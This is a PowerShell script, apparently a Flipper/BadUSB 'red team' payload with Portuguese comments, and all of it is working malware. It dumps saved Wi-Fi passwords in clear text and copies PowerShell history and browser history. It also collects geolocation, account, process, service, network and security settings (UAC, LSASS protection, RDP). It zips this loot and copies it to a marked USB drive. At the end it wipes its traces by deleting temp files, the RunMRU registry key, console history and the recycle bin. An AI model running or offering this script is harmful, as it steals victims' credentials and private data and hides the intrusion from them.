<#
.SYNOPSIS
    ADV-Recon Stealth — Red Team Edition
    Recon rapido. Exfiltracao em 30s. Output: apenas OK ou NOK.
    Cleanup completo sempre.
#>

############################################################################################################################################################
# JANELA: minimizada mas nao hidden (precisamos mostrar OK/NOK)
############################################################################################################################################################

$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int h, int s);'
Add-Type -Name W -Member $i -Namespace N
[N.W]::ShowWindow(([Diagnostics.Process]::GetCurrentProcess()|Get-Process).MainWindowHandle, 6)

############################################################################################################################################################
# FUNCOES SILENCIOSAS
############################################################################################################################################################

$Global:Log = @()
function L($m){$Global:Log+=("[{0:HH:mm:ss}] {1}" -f (Get-Date),$m)}

L 'ADV-Recon Stealth iniciado'
L ('User: '+$env:USERNAME+' | PC: '+$env:COMPUTERNAME)

############################################################################################################################################################
# CONFIG
############################################################################################################################################################

$Timeout   = 30
$OutFolder = 'loot'
$Marker    = 'badusb'
$IgnoreIDs = @('C:','D:')
$IgnoreVOL = @('Google Drive','EVO')

$Fn  = $env:USERNAME+'-LOOT-'+(Get-Date -f 'yyyy-MM-dd_HH-mm')
$Zip = $Fn+'.zip'
$WD  = $env:TEMP+'\'+$Fn
$ZP  = $env:TEMP+'\'+$Zip

mkdir $WD -Force|Out-Null

############################################################################################################################################################
# RECON (zero delays, zero output para ecra)
############################################################################################################################################################

L 'ETAPA 1: Tree'
try{tree $Env:userprofile /a /f 2>$null> ($WD+'\tree.txt')}catch{}

L 'ETAPA 2: PS History'
try{cp ($env:APPDATA+'\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt') ($WD+'\pshist.txt') -ea 0}catch{}

L 'ETAPA 3: User data'
try{$fn=(Get-LocalUser $env:USERNAME).FullName}catch{$fn=$env:USERNAME}
try{$em=(Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName}catch{$em='N/D'}
try{Add-Type -AssemblyName System.Device;$g=New-Object System.Device.Location.GeoCoordinateWatcher;$g.Start();while($g.Status -ne 'Ready' -and $g.Permission -ne 'Denied'){Sleep -m 50};if($g.Permission -eq 'Denied'){$la='N/D';$lo='N/D';$gs='Denied'}else{$la=$g.Position.Location.Latitude;$lo=$g.Position.Location.Longitude;$gs="OK"}}catch{$la='N/D';$lo='N/D';$gs='Err'}

L 'ETAPA 4: Local users'
try{$lu=Get-WmiObject Win32_UserAccount|ft Caption,Domain,Name,FullName,SID|Out-String}catch{$lu='Err'}

L 'ETAPA 5: UAC/LSASS/RDP'
try{$c=(gp 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System').ConsentPromptBehaviorAdmin;$p=(gp 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System').PromptOnSecureDesktop;if($c -eq 0 -and $p -eq 0){$ua='Never'}elseif($c -eq 5 -and $p -eq 0){$ua='Notify(no dim)'}elseif($c -eq 5 -and $p -eq 1){$ua='Notify(default)'}elseif($c -eq 2 -and $p -eq 1){$ua='Always'}else{$ua='Unknown'}}catch{$ua='Err'}
try{$ls=Get-Process lsass -ea Stop;if($ls.ProtectedProcess){$lst='PPL'}else{$lst='No PPL'}}catch{$lst='N/F'}
try{if((gp 'hklm:\System\CurrentControlSet\Control\Terminal Server').fDenyTSConnections -eq 0){$rd='On'}else{$rd='Off'}}catch{$rd='Err'}

L 'ETAPA 6: Network'
try{$pu=(iwr ipinfo.io/ip -UseBasicParsing -TimeoutSec 3).Content.Trim()}catch{$pu='Err'}
try{$lip=Get-NetIPAddress -IfAlias '*Ethernet*','*Wi-Fi*' -AddrFam IPv4 -ea 0|Select IfAlias,IPAddress,PrefixOrigin|Out-String}catch{$lip='Err'}
try{$mc=Get-NetAdapter -Name '*Ethernet*','*Wi-Fi*' -ea 0|Select Name,MacAddress,Status|Out-String}catch{$mc='Err'}

L 'ETAPA 7: WiFi'
try{$nw=(netsh wlan show networks mode=Bssid 2>$null|?{$_-like'SSID*'-or$_-like'*Auth*'-or$_-like'*Enc*'}).trim();if(!$nw){$nw='None'}}catch{$nw='Err'}
try{$wp=(netsh wlan show profiles 2>$null)|sls ':(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wlan show profile name="$n" key=clear 2>$null)}|sls 'Key Content\W+:(.+)$'|%{$p=$_.Matches.Groups[1].Value.Trim();$_}|%{[PSCustomObject]@{PROFILE_NAME=$n;PASSWORD=$p}}|ft -Auto|Out-String;if(!$wp.Trim()){$wp='None'}}catch{$wp='Err'}

L 'ETAPA 8: System'
try{$cs=Get-CimInstance CIM_ComputerSystem;$cn=$cs.Name;$cm=$cs.Model;$cf=$cs.Manufacturer}catch{$cn=$env:COMPUTERNAME;$cm='?';$cf='?'}
try{$bios=Get-CimInstance CIM_BIOSElement|Out-String}catch{$bios='Err'}
try{$os=(gwmi win32_operatingsystem)|Select Caption,Version|Out-String}catch{$os='Err'}
try{$cpu=gwmi Win32_Processor|select DeviceID,Name,Caption,Manufacturer,MaxClockSpeed,L2CacheSize,L2CacheSpeed,L3CacheSize,L3CacheSpeed|fl|Out-String}catch{$cpu='Err'}
try{$mb=gwmi Win32_BaseBoard|fl|Out-String}catch{$mb='Err'}
try{$rc=gwmi Win32_PhysicalMemory|measure Capacity -sum|%{'{0:N1} GB'-f($_.sum/1GB)}}catch{$rc='Err'}
try{$rm=gwmi Win32_PhysicalMemory|select DeviceLocator,@{N='Capacity';E={'{0:N1} GB'-f($_.Capacity/1GB)}},ConfiguredClockSpeed,ConfiguredVoltage|ft|Out-String}catch{$rm='Err'}
try{$vc=gwmi Win32_VideoController|ft Name,VideoProcessor,DriverVersion,CurrentHorizontalResolution,CurrentVerticalResolution|Out-String -w 250}catch{$vc='Err'}

L 'ETAPA 9: Disks/Devices'
try{$dt=@{2='Rem';3='Fix';4='Net';5='CD'};$hd=gwmi Win32_LogicalDisk|select DeviceID,VolumeName,@{N='Tipo';E={$dt[[int]$_.DriveType]}},FileSystem,VolumeSerialNumber,@{N='Sz';E={'{0:N1}G'-f($_.Size/1Gb)}},@{N='Fr';E={'{0:N1}G'-f($_.FreeSpace/1Gb)}},@{N='FrP';E={'{0:N1}'-f((100/($_.Size/$_.FreeSpace)))}}|ft DeviceID,VolumeName,Tipo,FileSystem,VolumeSerialNumber,@{N='Size';E={$_.Sz};align='right'},@{N='Free';E={$_.Fr};align='right'},@{N='Free%';E={($_.FrP+' %%')};align='right'}|Out-String}catch{$hd='Err'}
try{$cmdev=gwmi Win32_USBControllerDevice -ea 0|%{[Wmi]($_.Dependent)}|Select Name,DeviceID,Manufacturer|sort Name -Desc|ft|Out-String -w 250}catch{$cmdev='Err'}
try{$na=gwmi Win32_NetworkAdapterConfiguration|?{$_.MACAddress -notlike $null}|select Index,Description,IPAddress,DefaultIPGateway,MACAddress|ft|Out-String -w 250}catch{$na='Err'}

L 'ETAPA 10: Processes/Connections/Services'
try{$pr=gwmi win32_process|select Handle,ProcessName,ExecutablePath,CommandLine|sort ProcessName|ft Handle,ProcessName,ExecutablePath,CommandLine|Out-String -w 250}catch{$pr='Err'}
try{$tc=Get-NetTCPConnection -ea 0|select @{N='Local';E={$_.LocalAddress+':'+$_.LocalPort}},@{N='Remote';E={$_.RemoteAddress+':'+$_.RemotePort}},State,AppliedSetting,OwningProcess;$tc=$tc|%{$li=$_;$pi=($pr|?{[int]$_.Handle -like[int]$li.OwningProcess});New-Object PSObject -p @{Local=$li.Local;Remote=$li.Remote;State=$li.State;Applied=$li.AppliedSetting;PID=$li.OwningProcess;Proc=$pi.ProcessName}}|select Local,Remote,State,Applied,PID,Proc|sort Local|ft|Out-String -w 250}catch{$tc='Err'}
try{$sv=gwmi win32_service|select State,Name,DisplayName,PathName,@{N='Srt';E={$_.State+$_.Name}}|sort Srt|ft State,Name,DisplayName,PathName|Out-String -w 250}catch{$sv='Err'}

L 'ETAPA 11: Software/Drivers'
try{$sw=gp HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|?{$_.DisplayName -notlike $null}|Select DisplayName,DisplayVersion,Publisher,InstallDate|sort DisplayName|ft -Auto|Out-String -w 250}catch{$sw='Err'}
try{$dr=gwmi Win32_PnPSignedDriver|?{$_.DeviceName -notlike $null}|select DeviceName,FriendlyName,DriverProviderName,DriverVersion|Out-String -w 250}catch{$dr='Err'}

L 'ETAPA 12: Misc'
try{$su=(ls ([Environment]::GetFolderPath('Startup')) -ea 0).Name -join ', ';if(!$su){$su='(vazio)'}}catch{$su='Err'}
try{$st=(Get-ScheduledTask -ea 0|Select TaskName,State|ft -Auto|Out-String)}catch{$st='Err'}
try{$kl=klist sessions 2>$null;if(!$kl){$kl='Nenhuma'}}catch{$kl='Err'}
try{$rf=ls $env:USERPROFILE -Recurse -File -ea 0|sort LastWriteTime -Desc|select -First 50 FullName,LastWriteTime|Out-String}catch{$rf='Err'}

L 'ETAPA 13: Browser data'
function B($b,$t){
  $rx='(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
  if($b-eq'chrome'-and$t-eq'history'){$p="$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
  elseif($b-eq'chrome'-and$t-eq'bookmarks'){$p="$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
  elseif($b-eq'edge'-and$t-eq'history'){$p="$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"}
  elseif($b-eq'edge'-and$t-eq'bookmarks'){$p="$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"}
  elseif($b-eq'firefox'-and$t-eq'history'){$p="$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
  else{return}
  try{gc $p -ea 0|sls -AllMatches $rx|%{$_.Matches.Value}|sort -u|%{[PSCustomObject]@{User=$env:UserName;Browser=$b;Type=$t;Data=$_}}}catch{}
}
$bl=$WD+'\BrowserData.txt'
B edge history>>$bl 2>$null;B edge bookmarks>>$bl 2>$null;B chrome history>>$bl 2>$null;B chrome bookmarks>>$bl 2>$null;B firefox history>>$bl 2>$null
L 'OK: Browser data done'

############################################################################################################################################################
# COMPILAR & COMPRIMIR
############################################################################################################################################################

L 'Compilando relatorio'
$out=@"
ADV-Recon Stealth
=================

Full Name: $fn
Email: $em
Geo: Lat=$la Lon=$lo ($gs)
----------------------------------------------------------------
Local Users:
$lu
----------------------------------------------------------------
UAC: $ua | LSASS: $lst | RDP: $rd
Public IP: $pu
Local IPs:
$lip
MAC:
$mc
----------------------------------------------------------------
Computer: $cn | Model: $cm | Mfr: $cf
BIOS:
$bios
OS:
$os
CPU:
$cpu
MB:
$mb
RAM: $rc
$rm
GPU:
$vc
----------------------------------------------------------------
Startup: $su
Scheduled Tasks:
$st
Sessions:
$kl
Recent Files:
$rf
----------------------------------------------------------------
Disks:
$hd
COM/USB:
$cmdev
Network:
$na
----------------------------------------------------------------
WiFi Nearby:
$nw
WiFi Profiles:
$wp
----------------------------------------------------------------
Processes:
$pr
----------------------------------------------------------------
Connections:
$tc
----------------------------------------------------------------
Services:
$sv
----------------------------------------------------------------
Software:
$sw
----------------------------------------------------------------
Drivers:
$dr
----------------------------------------------------------------
"@
$out>($WD+'\computerData.txt')

try{Compress-Archive $WD $ZP -Force;L ('ZIP: '+$ZP)}catch{L 'ZIP FAIL'}

############################################################################################################################################################
# ESPERAR FLIPPER (30s)
############################################################################################################################################################

Write-Host ''
Write-Host '[*] Wait 30s...' -ForegroundColor DarkGray

$found=$null
$t=0

while($t -lt $Timeout -and !$found){
  try{$vs=gwmi Win32_LogicalDisk -ea Stop|?{($_.DriveType -eq 2 -or $_.DriveType -eq 3) -and $_.DeviceID -notin $IgnoreIDs -and $_.VolumeName -notin $IgnoreVOL}}catch{$vs=@()}
  foreach($v in $vs){
    try{
      if(!(Test-Path ($v.DeviceID+'\') -ea Stop)){continue}
      if(Test-Path ($v.DeviceID+'\'+$Marker) -ea Stop){
        $found=$v.DeviceID
        break
      }
    }catch{}
  }
  if(!$found){
    $r=$Timeout-$t
    Write-Host ("`r  {0}s " -f $r) -NoNewline -ForegroundColor DarkGray
    Sleep 1
    $t++
  }
}

############################################################################################################################################################
# EXFILTRACAO
############################################################################################################################################################

$ok=$false

if($found){
  $dest=$found+'\'+$OutFolder+'\'+$env:COMPUTERNAME+'-'+(Get-Date -f 'yyyy-MM-dd_HH-mm')
  try{
    mkdir $dest -Force|Out-Null
    $df=$dest+'\'+$Zip
    cp $ZP $df -Force
    $sh=(Get-FileHash $ZP -Algorithm MD5).Hash
    $dh=(Get-FileHash $df -Algorithm MD5).Hash
    if($sh -eq $dh){
      # Log no Flipper
      $Global:Log|Out-File ($found+'\debug.log') -Force
      $ok=$true
    }
  }catch{}
}

############################################################################################################################################################
# OUTPUT FINAL
############################################################################################################################################################

if($ok){
  Write-Host "`rOK   " -ForegroundColor Green -NoNewline
}else{
  Write-Host "`rNOK  " -ForegroundColor Red -NoNewline
}
Sleep 2
Clear-Host

############################################################################################################################################################
# CLEANUP TOTAL
############################################################################################################################################################

try{ri $WD -Recurse -Force -ea 0}catch{}
try{ri $ZP -Force -ea 0}catch{}
try{ri ($env:TEMP+'\*') -Recurse -Force -ea 0}catch{}
try{reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 2>$null}catch{}
try{ri (Get-PSreadlineOption).HistorySavePath -ea 0}catch{}
try{Clear-RecycleBin -Force -ea 0}catch{}

exit